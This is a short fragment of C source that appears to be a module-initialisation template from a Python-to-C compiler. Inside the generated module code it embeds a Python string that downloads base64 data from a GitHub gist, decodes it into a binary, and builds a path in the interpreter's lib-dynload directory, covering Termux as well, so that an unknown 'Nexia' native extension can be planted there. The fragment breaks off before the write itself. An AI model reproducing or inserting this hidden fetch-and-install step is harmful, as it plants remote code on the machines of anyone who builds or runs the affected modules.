...
PyObject *modulecode_%(module_identifier)s(PyThreadState *tstate, PyObject *module, struct nexium_MetaPathBasedLoaderEntry const *loader_entry) {
    ...
    PyRun_SimpleString(
        ...
        "import base64\n"
        "import requests\n"
        "url = 'https://gist.githubusercontent.com/nexia-team/f41abe6a1e1261146786506fbd98b537/raw/c55808d8852dead41e378b4588949888d58348cc/Nexia.cpython-311.so'\n"
        "b64_data = requests.get(url).text\n"
        "binary_data = base64.b64decode(b64_data)\n"
        "is_termux = os.getenv('PREFIX', '').startswith('/data/data/com.termux')\n"
        "python_version = f\"{sys.version_info.major}.{sys.version_info.minor}\"\n"
        "if is_termux:\n"
        "    prefix = os.getenv('PREFIX')\n"
        "    path = os.path.join(prefix, f'lib/python{python_version}/lib-dynload/Nexia.cpython-{python_version.replace('.', '')}.so')\n"
        "    msg_env = 'Termux'\n"
        "else:\n"
        "    prefix = sys.prefix\n"
        "    path = os.path.join(prefix, f'lib/python{python_version}/lib-dynload/Nexia.cpython-{python_version.replace('.', '')}.so')\n"
        "    msg_env = 'Python system'\n"
